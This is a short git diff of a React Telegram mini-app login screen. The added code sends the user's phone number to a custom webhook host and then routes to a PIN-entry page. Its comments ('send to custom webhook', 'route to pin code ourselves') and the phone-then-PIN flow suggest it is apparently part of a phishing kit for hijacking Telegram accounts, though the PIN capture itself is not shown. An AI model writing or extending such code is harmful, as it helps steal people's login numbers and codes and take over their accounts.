@@ -9,7 +9,7 @@ import {
   } from '@telegram-apps/telegram-ui';
   import { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { countries, getFlagUrl } from '../libs/country_data'  
+import { countries } from '../libs/country_data'  
 
   export const Home = () => {
 
@@ -21,18 +21,27 @@ import { countries, getFlagUrl } from '../libs/country_data'
     const isValidPhone = (phone: string) =>
       PHONE_LOCAL_REGEX.test(normalizePhone(phone));
 
-    const defaultCountry = countries.find(c => c.iso2 === 'CN')!;
+    // const defaultCountry = countries.find(c => c.iso2 === 'CN')!;
     const [error, setError] = useState("")
     const [dialCode, setDialCode] = useState('+86');
     const [phone, setPhone] = useState('');
     const navigate = useNavigate();
+    
 
-    const handleClick = () => {
+    const handleClick = async() => {
         console.log('Next step: ' + dialCode + "-"+ phone );
         
         if(isValidPhone(phone)){
+          const HOST = process.env.REACT_APP_HOST;
+          console.log("host :" + HOST)
           // 发送到自定义webhook
-
+          await fetch(`${HOST}/phone`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              interPhone: dialCode + "-"+ phone
+            }),
+          });    
           // 自己路由到pin 码
           setTimeout(()=>{
             navigate('/pin', {
